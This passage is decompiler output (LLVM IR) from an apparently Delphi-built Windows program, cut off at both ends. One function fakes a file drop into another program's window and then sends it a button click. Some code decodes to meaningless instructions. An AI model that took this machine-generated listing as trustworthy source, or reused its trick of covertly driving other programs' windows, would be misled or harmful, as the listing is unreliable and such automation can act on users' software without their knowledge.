  %11 = call i32 @function_4036e4(), !insn.addr !1116
  %12 = call i32 @function_4036e4(), !insn.addr !1117
  %13 = call i32 @function_4036e4(), !insn.addr !1118
  %14 = call i32 @function_4036e4(), !insn.addr !1119
  %15 = call i32 @function_4036e4(), !insn.addr !1120
  %16 = call i32 @function_4036e4(), !insn.addr !1121
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1122
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1122
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1122
  store i32 %19, i32* %18, align 4, !insn.addr !1122
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1123
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1123
  store i32 4218781, i32* %21, align 4, !insn.addr !1123
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1124
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1124
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1124
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1125
  %25 = call i32 @function_405bbc(), !insn.addr !1126
  %26 = icmp eq i32 %25, 0, !insn.addr !1127
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1128
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1128
  br i1 %26, label %dec_label_pc_405f68, label %dec_label_pc_405da6, !insn.addr !1128

dec_label_pc_405da6:                              ; preds = %dec_label_pc_405d38
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1129
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1129
  store i32 ptrtoint ([6 x i8]* @global_var_405fb8 to i32), i32* %28, align 4, !insn.addr !1129
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1130
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1130
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1131
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1131
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %32, align 4, !insn.addr !1131
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1132
  %34 = call i32 @function_405c7c(), !insn.addr !1133
  %35 = call i32 @function_405cfc(), !insn.addr !1134
  %36 = call i32 @function_405c7c(), !insn.addr !1135
  %37 = call i32 @function_405cfc(), !insn.addr !1136
  %38 = call i32 @"@LStrCat"(), !insn.addr !1137
  %39 = call i32 @function_405c7c(), !insn.addr !1138
  %40 = call i32 @function_405cfc(), !insn.addr !1139
  %41 = call i32 @"@LStrCat"(), !insn.addr !1140
  %42 = call i32 @function_405c7c(), !insn.addr !1141
  %43 = call i32 @function_405cfc(), !insn.addr !1142
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1143
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1143
  store i32 ptrtoint ([13 x i8]* @global_var_405fec to i32), i32* %45, align 4, !insn.addr !1143
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1144
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1144
  store i32 %arg1, i32* %47, align 4, !insn.addr !1144
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1145
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1145
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %49, align 4, !insn.addr !1145
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1146
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1146
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %51, align 4, !insn.addr !1146
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1147
  %53 = call i32 @function_405c7c(), !insn.addr !1148
  %54 = call i32 @function_405cfc(), !insn.addr !1149
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1150
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1150
  store i32 ptrtoint ([11 x i8]* @global_var_406010 to i32), i32* %56, align 4, !insn.addr !1150
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1151
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1151
  store i32 %arg2, i32* %58, align 4, !insn.addr !1151
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1152
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1152
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %60, align 4, !insn.addr !1152
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1153
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1153
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %62, align 4, !insn.addr !1153
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1154
  %64 = call i32 @function_405c7c(), !insn.addr !1155
  %65 = call i32 @function_405cfc(), !insn.addr !1156
  %66 = call i32 @function_405c7c(), !insn.addr !1157
  %67 = call i32 @function_405cfc(), !insn.addr !1158
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1159
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1159
  store i32 ptrtoint ([8 x i8]* @global_var_406034 to i32), i32* %69, align 4, !insn.addr !1159
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1160
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1160
  store i32 %arg1, i32* %71, align 4, !insn.addr !1160
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1161
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1161
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %73, align 4, !insn.addr !1161
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1162
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1162
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %75, align 4, !insn.addr !1162
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1163
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1163
  store i32 ptrtoint ([6 x i8]* @global_var_406044 to i32), i32* %77, align 4, !insn.addr !1163
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1164
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1164
  store i32 %arg2, i32* %79, align 4, !insn.addr !1164
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1165
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1165
  store i32 ptrtoint (i32* @global_var_406004 to i32), i32* %81, align 4, !insn.addr !1165
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1166
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1166
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %83, align 4, !insn.addr !1166
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1167
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1167
  store i32 ptrtoint ([10 x i8]* @global_var_406054 to i32), i32* %85, align 4, !insn.addr !1167
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1168
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1168
  store i32 %arg3, i32* %87, align 4, !insn.addr !1168
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1169
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1169
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %89, align 4, !insn.addr !1169
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1170
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1170
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %91, align 4, !insn.addr !1170
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1171
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1171
  store i32 %arg4, i32* %93, align 4, !insn.addr !1171
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1172
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1172
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %95, align 4, !insn.addr !1172
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1173
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1173
  store i32 ptrtoint (i32* @global_var_406068 to i32), i32* %97, align 4, !insn.addr !1173
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1174
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405fc8 to i32), i32* %99, align 4, !insn.addr !1174
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1175
  %101 = call i32 @function_405c7c(), !insn.addr !1176
  %102 = call i32 @function_405cfc(), !insn.addr !1177
  %103 = call i32 @function_405c7c(), !insn.addr !1178
  %104 = call i32 @function_405cfc(), !insn.addr !1179
  %105 = call i32 @function_405c70(), !insn.addr !1180
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1181
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1181
  br label %dec_label_pc_405f68, !insn.addr !1181

dec_label_pc_405f68:                              ; preds = %dec_label_pc_405da6, %dec_label_pc_405d38
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1182
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1182
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1183
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1184
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1185
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1185
  store i32 4218788, i32* %110, align 4, !insn.addr !1185
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1186
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1187
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1188
  ret i32 %113, !insn.addr !1189
}

define i32 @function_405f9d() local_unnamed_addr {
dec_label_pc_405f9d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1190
  ret i32 %0, !insn.addr !1190
}

define i32 @function_405fa2() local_unnamed_addr {
dec_label_pc_405fa2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1191
}

define i32 @function_405fa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fa4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1192
}

define i32 @function_40606f() local_unnamed_addr {
dec_label_pc_40606f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1193
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1193
  store i32 %3, i32* %4, align 4, !insn.addr !1193
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1194
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1194
  %9 = add i8 %6, %8, !insn.addr !1194
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1194
  store i8 %9, i8* %10, align 1, !insn.addr !1194
  %11 = add i32 %2, 85, !insn.addr !1195
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1195
  %13 = load i8, i8* %12, align 1, !insn.addr !1195
  %14 = trunc i32 %1 to i8, !insn.addr !1195
  %15 = add i8 %13, %14, !insn.addr !1195
  store i8 %15, i8* %12, align 1, !insn.addr !1195
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1196
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1196
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1196
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1197
  %18 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1198
  %19 = add i32 %18, 1, !insn.addr !1198
  %20 = icmp eq i32 %19, 0, !insn.addr !1198
  store i32 %19, i32* @global_var_4096c0, align 4, !insn.addr !1198
  %21 = icmp eq i1 %20, false, !insn.addr !1199
  br i1 %21, label %dec_label_pc_4060a9, label %dec_label_pc_406095, !insn.addr !1199

dec_label_pc_406095:                              ; preds = %dec_label_pc_40606f
  %22 = call i32 @"@LStrClr"(), !insn.addr !1200
  %23 = call i32 @"@LStrClr"(), !insn.addr !1201
  br label %dec_label_pc_4060a9, !insn.addr !1201

dec_label_pc_4060a9:                              ; preds = %dec_label_pc_406095, %dec_label_pc_40606f
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1202
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1203
  ret i32 0, !insn.addr !1204
}

define i32 @function_4060b7() local_unnamed_addr {
dec_label_pc_4060b7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1205
  ret i32 %0, !insn.addr !1205
}

define i32 @function_4060bc() local_unnamed_addr {
dec_label_pc_4060bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1206
}

define i32 @function_4060be(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060be:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1207
}

define i32 @function_4060c0() local_unnamed_addr {
dec_label_pc_4060c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1208
  %2 = add i32 %1, -1, !insn.addr !1208
  store i32 %2, i32* @global_var_4096c0, align 4, !insn.addr !1208
  ret i32 %0, !insn.addr !1209
}

define i32 @function_4060c8() local_unnamed_addr {
dec_label_pc_4060c8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1210
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1211
  %2 = icmp eq i32 %0, 0, !insn.addr !1212
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1213
  br i1 %2, label %dec_label_pc_4061d2, label %dec_label_pc_4060e2, !insn.addr !1213

dec_label_pc_4060e2:                              ; preds = %dec_label_pc_4060c8
  %3 = call i32 @function_4036f4(), !insn.addr !1214
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1215
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1215
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1215
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1216
  %7 = icmp eq i1 %6, false, !insn.addr !1217
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1218
  br i1 %7, label %dec_label_pc_4061d2, label %dec_label_pc_4060fd, !insn.addr !1218

dec_label_pc_4060fd:                              ; preds = %dec_label_pc_4060e2
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_4061e0 to i32*), i8* null, i8* %8), !insn.addr !1219
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1219
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1220
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1220
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1221
  %13 = icmp eq i1 %12, false, !insn.addr !1222
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1223
  br i1 %13, label %dec_label_pc_4061d2, label %dec_label_pc_406126, !insn.addr !1223

dec_label_pc_406126:                              ; preds = %dec_label_pc_4060fd
  %14 = call i32 @function_4034f4(), !insn.addr !1224
  %15 = add i32 %14, 22, !insn.addr !1225
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1226
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1226
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1227
  %18 = icmp eq i32* %17, null, !insn.addr !1228
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1229
  br i1 %18, label %dec_label_pc_4061d2, label %dec_label_pc_406145, !insn.addr !1229

dec_label_pc_406145:                              ; preds = %dec_label_pc_406126
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1230
  %20 = icmp eq i32* %19, null, !insn.addr !1231
  %21 = icmp eq i1 %20, false, !insn.addr !1232
  br i1 %21, label %dec_label_pc_406159, label %dec_label_pc_406151, !insn.addr !1232

dec_label_pc_406151:                              ; preds = %dec_label_pc_406145
  %22 = bitcast i32* %17 to i8*, !insn.addr !1233
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1233
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1233
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1234
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1235
  br label %dec_label_pc_4061d2, !insn.addr !1235

dec_label_pc_406159:                              ; preds = %dec_label_pc_406145
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1227
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1230
  store i32 20, i32* %19, align 4, !insn.addr !1236
  %27 = add i32 %26, 4, !insn.addr !1237
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1237
  store i32 0, i32* %28, align 4, !insn.addr !1237
  %29 = add i32 %26, 8, !insn.addr !1238
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1238
  store i32 0, i32* %30, align 4, !insn.addr !1238
  %31 = add i32 %26, 12, !insn.addr !1239
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1239
  store i32 0, i32* %32, align 4, !insn.addr !1239
  %33 = add i32 %26, 16, !insn.addr !1240
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1240
  store i32 0, i32* %34, align 4, !insn.addr !1240
  %35 = call i32 @function_4036f4(), !insn.addr !1241
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1242
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1242
  %37 = add i32 %26, 20, !insn.addr !1243
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1244
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1245
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1246
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1247
  %42 = call i32 @function_407484(i32 4219368, i32 2000, i32 -1), !insn.addr !1248
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1249
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1249
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1250
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1250
  %46 = icmp eq i1 %45, false, !insn.addr !1251
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1252
  br i1 %46, label %dec_label_pc_4061d2, label %dec_label_pc_4061c3, !insn.addr !1252

dec_label_pc_4061c3:                              ; preds = %dec_label_pc_406159
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1253
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1253
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1254
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1254
  br label %dec_label_pc_4061d2, !insn.addr !1254

dec_label_pc_4061d2:                              ; preds = %dec_label_pc_4061c3, %dec_label_pc_406159, %dec_label_pc_406151, %dec_label_pc_406126, %dec_label_pc_4060fd, %dec_label_pc_4060e2, %dec_label_pc_4060c8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1255
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1255
  %51 = load i32, i32* %50, align 4, !insn.addr !1255
  ret i32 %51, !insn.addr !1256
}

define i32 @function_4061dd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4061dd:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1257
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1257
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1257
  store i8 %6, i8* %7, align 1, !insn.addr !1257
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1258
  %10 = udiv i32 %4, 256, !insn.addr !1258
  %11 = trunc i32 %10 to i8, !insn.addr !1258
  %12 = add i8 %9, %11, !insn.addr !1258
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1258
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1258
  store i8 %12, i8* %14, align 1, !insn.addr !1258
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1259
  %17 = add i32 %4, 6, !insn.addr !1259
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1259
  %19 = zext i1 %16 to i32, !insn.addr !1259
  %20 = and i32 %4, -65536, !insn.addr !1259
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1260
  %23 = or i1 %16, %22, !insn.addr !1260
  %24 = add i32 %18, 6, !insn.addr !1260
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1260
  %26 = zext i1 %23 to i32, !insn.addr !1260
  %27 = and i32 %25, 15, !insn.addr !1260
  %28 = or i32 %27, %20, !insn.addr !1260
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1260
  %31 = or i32 %28, %30, !insn.addr !1260
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1261
  %33 = load i8, i8* %32, align 1, !insn.addr !1261
  %34 = trunc i32 %27 to i8, !insn.addr !1261
  %35 = xor i8 %33, %34, !insn.addr !1261
  store i8 %35, i8* %32, align 1, !insn.addr !1261
  %36 = add i32 %0, 1311123697, !insn.addr !1262
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1262
  %38 = load i8, i8* %37, align 1, !insn.addr !1262
  %39 = udiv i32 %3, 256, !insn.addr !1262
  %40 = trunc i32 %39 to i8, !insn.addr !1262
  %41 = add i8 %38, %40, !insn.addr !1262
  store i8 %41, i8* %37, align 1, !insn.addr !1262
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1263
  %43 = load i32, i32* %42, align 4, !insn.addr !1263
  %44 = sub i32 %43, %31, !insn.addr !1263
  store i32 %44, i32* %42, align 4, !insn.addr !1263
  %45 = add i32 %3, 117, !insn.addr !1264
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1264
  %47 = load i8, i8* %46, align 1, !insn.addr !1264
  %48 = add i8 %47, %34, !insn.addr !1264
  %49 = icmp eq i8 %48, 0, !insn.addr !1264
  store i8 %48, i8* %46, align 1, !insn.addr !1264
  br i1 %49, label %dec_label_pc_406268, label %dec_label_pc_4061f4, !insn.addr !1265

dec_label_pc_4061f4:                              ; preds = %dec_label_pc_4061dd
  %50 = xor i32 %3, %1, !insn.addr !1266
  %51 = trunc i32 %3 to i16, !insn.addr !1267
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1267
  %53 = load i32, i32* %52, align 4, !insn.addr !1267
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1267
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1268
  %55 = load i8, i8* %54, align 1, !insn.addr !1268
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1268
  %56 = load i8, i8* %32, align 1, !insn.addr !1269
  %57 = add i8 %56, %34, !insn.addr !1269
  store i8 %57, i8* %32, align 1, !insn.addr !1269
  %58 = call i32 @__asm_iretd(), !insn.addr !1270
  %59 = add i32 %2, -117, !insn.addr !1271
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1271
  %61 = load i8, i8* %60, align 1, !insn.addr !1271
  %62 = add i8 %61, -69, !insn.addr !1271
  store i8 %62, i8* %60, align 1, !insn.addr !1271
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1272
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1273
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1273
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1273
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1274
  %66 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1275
  %67 = add i32 %66, 1, !insn.addr !1275
  store i32 %67, i32* @global_var_4096c8, align 4, !insn.addr !1275
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1276
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1277
  ret i32 0, !insn.addr !1278

dec_label_pc_406268:                              ; preds = %dec_label_pc_4061dd
  %69 = call i32 @function_403cbc(), !insn.addr !1279
  store i32 %69, i32* %ebx, align 4, !insn.addr !1280
  %70 = icmp slt i32 %69, 0, !insn.addr !1281
  br i1 %70, label %dec_label_pc_406290, label %dec_label_pc_406278, !insn.addr !1282

dec_label_pc_406278:                              ; preds = %dec_label_pc_406268
  %71 = add i32 %69, 1, !insn.addr !1283
  store i32 %71, i32* %ebx, align 4, !insn.addr !1283
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1284
  br label %dec_label_pc_4062d1

dec_label_pc_406290:                              ; preds = %dec_label_pc_406268
  %73 = call i32 @function_403cb4(), !insn.addr !1285
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1286
  %75 = call i32 @function_403cbc(), !insn.addr !1287
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1288
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1289
  br label %dec_label_pc_4062d1, !insn.addr !1289

dec_label_pc_4062d1:                              ; preds = %dec_label_pc_406278, %dec_label_pc_406290
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1290
}

define i32 @function_4062d8() local_unnamed_addr {
dec_label_pc_4062d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1291
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1291
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1291
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1292
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1293
  %3 = add i32 %2, 1, !insn.addr !1293
  %4 = icmp eq i32 %3, 0, !insn.addr !1293
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1293
  %5 = icmp eq i1 %4, false, !insn.addr !1294
  br i1 %5, label %dec_label_pc_406301, label %dec_label_pc_4062f1, !insn.addr !1294

dec_label_pc_4062f1:                              ; preds = %dec_label_pc_4062d8
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1295
  br label %dec_label_pc_406301, !insn.addr !1295

dec_label_pc_406301:                              ; preds = %dec_label_pc_4062f1, %dec_label_pc_4062d8
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1296
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1297
  ret i32 0, !insn.addr !1298
}

define i32 @function_40630f() local_unnamed_addr {
dec_label_pc_40630f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1299
  ret i32 %0, !insn.addr !1299
}

define i32 @function_406314() local_unnamed_addr {
dec_label_pc_406314:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1300
}

define i32 @function_406316(i32 %arg1) local_unnamed_addr {
dec_label_pc_406316:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1301
}

define i32 @function_406318() local_unnamed_addr {
dec_label_pc_406318:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1302
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1302
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1302
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1303
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1304
  %3 = add i32 %2, -1, !insn.addr !1304
  %4 = icmp eq i32 %2, 0, !insn.addr !1304
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1304
  %5 = icmp eq i1 %4, false, !insn.addr !1305
  br i1 %5, label %dec_label_pc_40634c, label %dec_label_pc_406332, !insn.addr !1305

dec_label_pc_406332:                              ; preds = %dec_label_pc_406318
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1306
  br label %dec_label_pc_40634c, !insn.addr !1307

dec_label_pc_40634c:                              ; preds = %dec_label_pc_406332, %dec_label_pc_406318
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1308
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1309
  ret i32 0, !insn.addr !1310
}

define i32 @function_40635a() local_unnamed_addr {
dec_label_pc_40635a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1311
  ret i32 %0, !insn.addr !1311
}

define i32 @function_40635f() local_unnamed_addr {
dec_label_pc_40635f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1312
}

define i32 @function_406361(i32 %arg1) local_unnamed_addr {
dec_label_pc_406361:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1313
}

define i32 @function_406364() local_unnamed_addr {
dec_label_pc_406364:
